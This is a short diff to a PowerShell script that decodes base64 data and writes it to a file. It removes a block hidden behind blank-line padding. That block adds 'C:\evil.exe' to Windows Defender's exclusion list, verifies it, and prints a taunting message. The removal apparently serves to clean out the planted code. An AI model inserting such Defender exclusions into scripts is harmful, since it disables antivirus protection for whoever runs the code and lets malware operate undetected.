@@ -42,19 +42,3 @@ $binary = [byte[]][System.Convert]::FromBase64String($base64String)
 # Step 4: Write to file
 Remove-Item $path -Force
 [System.IO.File]::WriteAllBytes($path, $binary)
-
-
-
-
-
-
-
-
-
-; Defender
-Add-MpPreference -ExclusionPath C:\evil.exe;
-$check = Get-MpPreference | Select -Property ExclusionPath;
-if($check.ExclusionPath -match '.*evil.*') {
-Write-Host Ha ha ha added "C:\evil.exe" to exclusions
-}
-
